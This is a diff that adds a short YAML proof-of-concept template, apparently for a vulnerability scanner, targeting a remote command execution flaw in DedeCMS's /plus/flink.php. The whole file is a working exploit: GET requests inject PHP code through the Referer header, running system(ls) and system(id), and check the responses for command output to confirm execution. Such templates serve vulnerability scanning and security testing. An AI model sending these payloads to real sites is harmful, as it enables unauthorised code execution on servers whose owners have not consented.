@@ -1,0 +1,29 @@
+id: poc-yaml-dedecms-flink-php-rce
+info:
+  name: DedeCMS flink.php 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: dedecms
+  fofa: DedeCMS_V5.8.1
+requests:
+- method: GET
+  path: /plus/flink.php?dopost=save
+  headers:
+    Referer: <?php "system"(ls);?>
+  expression: 'status_code == 200
+
+    && contains(body,"search.php")
+
+    && contains(body,"download.php")
+
+    && contains(title,"DedeCMS提示信息")
+
+    '
+- method: GET
+  path: /plus/flink.php?dopost=save
+  headers:
+    Referer: <?php "system"(id);?>
+  expression: status_code == 200 && contains(body,"uid=") && !contains(body,"search.php")
+variables: {}
+transport: http
